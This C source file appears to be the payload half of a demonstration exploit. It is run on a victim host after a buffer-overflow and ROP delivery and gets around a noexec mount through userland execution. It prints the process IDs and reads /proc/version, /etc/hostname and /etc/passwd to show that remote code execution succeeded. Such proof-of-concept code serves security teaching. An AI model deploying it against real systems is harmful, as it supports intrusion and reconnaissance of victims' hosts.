/*
 * payload.c — attacker's binary, executed on the victim's noexec partition.
 *
 * The exploit delivers this ELF over the network during the buffer overflow
 * attack.  recv_and_exec() in the victim writes it to /tmp/noexec_rce_demo/payload
 * and executes it via userland_execv() — no execve(2) = noexec bypassed.
 *
 * Direct execution of this file is blocked by the noexec mount:
 *
 *   $ /tmp/noexec_rce_demo/payload
 *   bash: /tmp/noexec_rce_demo/payload: Permission denied
 *
 * The payload dumps host information to prove full RCE was achieved.
 */

#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>

static void dump_file(const char *label, const char *path, int limit)
{
    char buf[4096];
    int fd;
    ssize_t n;
    int total = 0;

    printf("[RCE] -- %s --\n", label);
    fd = open(path, O_RDONLY);
    if (fd < 0) {
        printf("  (could not open %s)\n", path);
        return;
    }
    while (total < limit) {
        int want = limit - total;
        if (want > (int)sizeof(buf) - 1)
            want = (int)sizeof(buf) - 1;
        n = read(fd, buf, (size_t)want);
        if (n <= 0)
            break;
        buf[n] = '\0';
        printf("%s", buf);
        total += (int)n;
    }
    close(fd);
    printf("\n");
}

int main(void)
{
    printf("\n");
    printf("+---------------------------------------------------------+\n");
    printf("|          *** PAYLOAD EXECUTED SUCCESSFULLY ***          |\n");
    printf("|                                                         |\n");
    printf("|  Delivered : over the network via stack BOF + ROP       |\n");
    printf("|  Location  : /tmp/noexec_rce_demo/payload (noexec mount)   |\n");
    printf("|  Bypass    : userland_execv() -- no execve(2) issued   |\n");
    printf("+---------------------------------------------------------+\n\n");

    printf("[RCE] PID  : %d\n",  (int)getpid());
    printf("[RCE] UID  : %d\n",  (int)getuid());
    printf("[RCE] GID  : %d\n\n", (int)getgid());

    dump_file("/proc/version", "/proc/version", 256);
    dump_file("/etc/hostname", "/etc/hostname", 128);
    dump_file("/etc/passwd (first entries)", "/etc/passwd", 400);

    printf("[RCE] Payload exiting.\n");
    return 0;
}
